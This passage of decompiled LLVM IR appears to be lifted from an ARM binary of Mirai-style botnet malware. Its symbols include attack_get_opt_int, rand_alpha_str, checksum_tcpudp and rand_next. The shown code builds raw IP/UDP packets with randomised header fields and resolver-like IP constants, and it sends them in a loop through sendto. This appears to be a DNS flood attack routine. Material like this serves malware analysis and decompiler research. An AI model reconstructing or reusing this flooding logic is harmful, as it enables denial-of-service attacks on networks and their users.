  %v0_c65c = load i32, i32* @r4, align 4
  store i32 %v0_c65c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %.thread18, %dec_label_pc_c658
  %v0_c670 = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v0_c674 = phi i32 [ %v0_c688, %.thread18 ], [ 0, %dec_label_pc_c658 ]
  %v1_c664 = load i32, i32* @r7, align 4
  %v2_c664 = add i32 %v1_c664, %v0_c674
  %v3_c664 = inttoptr i32 %v2_c664 to i8*
  %v4_c664 = load i8, i8* %v3_c664, align 1
  %v6_c664 = zext i8 %v4_c664 to i32
  store i32 %v6_c664, i32* %r3.global-to-local, align 4
  %v7_c668 = icmp eq i8 %v4_c664, 46
  store i1 %v7_c668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c668, label %bb118, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_c664
  %v1_c67014 = add nsw i32 %v0_c670, 1
  store i32 %v1_c67014, i32* %r2.global-to-local, align 4
  %v1_c67416 = add i32 %v0_c674, 1
  store i32 %v1_c67416, i32* %r1.global-to-local, align 4
  br label %bb119

bb118:                                            ; preds = %dec_label_pc_c664
  %v2_c66c = load i32, i32* @r4, align 4
  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v9_c6f0 = icmp eq i32 %v3_c494, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  %v9_c700 = icmp eq i32 %v3_c49c, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r5, align 4
  store i1 %v9_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v9_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v9_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v3_c494, { 1, 0, 2 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v7_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 36, 35, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 18, 17, 19, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), { 0, 2, 1, 3, 17, 16, 19, 45, 18, 46, 4, 6, 5, 20, 47, 21, 48, 50, 7, 51, 49, 22, 52, 23, 53, 24, 54, 55, 56, 25, 57, 58, 8, 60, 59, 29, 61, 28, 62, 26, 63, 27, 64, 66, 9, 67, 65, 68, 69, 33, 70, 32, 71, 30, 72, 31, 73, 11, 10, 74, 75, 34, 76, 35, 77, 13, 12, 78, 79, 36, 80, 37, 81, 82, 83, 38, 84, 85, 86, 87, 14, 88, 89, 39, 90, 40, 91, 41, 92, 93, 94, 15, 95, 96, 44, 97, 42, 98, 43, 99 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 87, 88, 89, 90, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
